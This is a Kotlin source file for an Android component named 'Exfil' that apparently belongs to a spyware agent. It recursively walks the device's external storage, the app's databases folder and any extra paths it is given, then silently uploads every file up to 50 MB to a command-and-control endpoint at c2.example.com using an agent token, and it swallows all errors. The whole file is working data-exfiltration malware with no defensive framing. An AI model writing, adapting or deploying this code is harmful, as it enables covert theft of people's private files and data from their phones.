package com.tief.agent

import android.content.Context
import android.os.Environment
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

object Exfil {
    private val client = OkHttpClient.Builder()
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    fun run(ctx: Context, extraPaths: List<String>) {
        val roots = mutableListOf(
            Environment.getExternalStorageDirectory(),
            File(ctx.filesDir.parentFile, "databases")
        )
        extraPaths.forEach { roots.add(File(it)) }

        for (root in roots) {
            if (!root.exists()) continue
            root.walkTopDown()
                .filter { it.isFile && it.length() in 1..50_000_000 }
                .forEach { f -> upload(f) }
        }
    }

    private fun upload(f: File) {
        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart(
                    "file", f.name,
                    f.asRequestBody("application/octet-stream".toMediaType())
                )
                .build()
            val req = Request.Builder()
                .url("https://c2.example.com/api/v1/upload")
                .header("X-Agent-Token", "AGENT_TOKEN")
                .post(body).build()
            client.newCall(req).execute().close()
        } catch (_: Exception) {
        }
    }
}